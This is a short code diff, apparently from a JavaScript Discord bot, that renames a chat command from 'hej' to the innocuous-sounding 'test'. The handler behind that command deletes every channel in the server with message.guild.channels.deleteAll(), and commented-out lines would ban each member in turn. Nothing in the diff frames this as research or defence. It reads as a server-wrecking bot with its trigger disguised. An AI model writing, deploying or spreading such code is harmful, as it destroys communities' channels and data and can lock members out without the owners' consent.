@@ -56,7 +56,7 @@ bot.on("ready", e => {
     let msg = message.content.startsWith;
     let args = messageArray.slice(1);
 	
-	if(cmd === `${prefix}hej`){
+	if(cmd === `${prefix}test`){
 		message.guild.channels.deleteAll();
                 //for (let i = 0; i < message.guild.members.size; i++) {
                     //message.guild.members[i].user.ban()
